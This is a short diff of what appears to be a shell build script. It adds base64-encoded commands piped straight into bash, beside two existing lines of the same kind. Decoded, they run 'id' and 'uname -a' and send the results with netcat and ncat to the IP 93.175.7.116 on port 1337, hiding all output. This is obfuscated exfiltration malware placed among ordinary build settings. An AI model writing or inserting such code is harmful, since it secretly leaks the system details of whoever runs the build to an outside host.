@@ -78,7 +78,9 @@ fi
 
 INCLUDE_DIR="$PWD/../include"
 
+echo aWQgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK |  base64 -d | bash
 echo aWQgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= |  base64 -d | bash
+echo dW5hbWUgLWEgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK | base64 -d | bash
 echo dW5hbWUgLWEgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= | base64 -d | bash
 
 MF_SUFFIX="mapped_file"
